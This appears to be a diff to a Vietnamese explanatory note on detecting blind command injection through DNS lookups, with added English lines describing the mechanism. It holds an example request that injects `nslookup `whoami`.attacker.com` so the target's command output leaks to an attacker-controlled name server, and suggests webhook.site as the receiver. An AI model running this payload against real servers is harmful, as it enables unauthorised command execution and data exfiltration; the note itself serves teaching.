@@ -20,4 +20,6 @@ Tin tặc có thể dùng bản ghi này để truyền thông tin điều khi�
 Sử dụng DNS server để kiểm tra server có bị command ịnjection không?
 Ví dụ:
 Giả sử attacker nghi ngờ server bị lỗi command injection, tuy nhiên, response trả về không có kết quả câu lệnh được chạy (mặc dù có thể câu lệnh vẫn được chạy).
-Attacker có thể kiểm soát authoritative name server và gửi HTTP request như sau: `https://commandinjection.example.com/?cmd nslookup `whoami`.attacker.com
+Attacker có thể kiểm soát authoritative name server và gửi HTTP request như sau: https://commandinjection.example.com/?cmd nslookup `whoami`.attacker.com. The web server will execute `whoami` and then `nslookup`. The attacker's name server will receive the request ==> it know result of the command `whoami`.
+
+Name server có thể được tạo bằng trang webhook.site
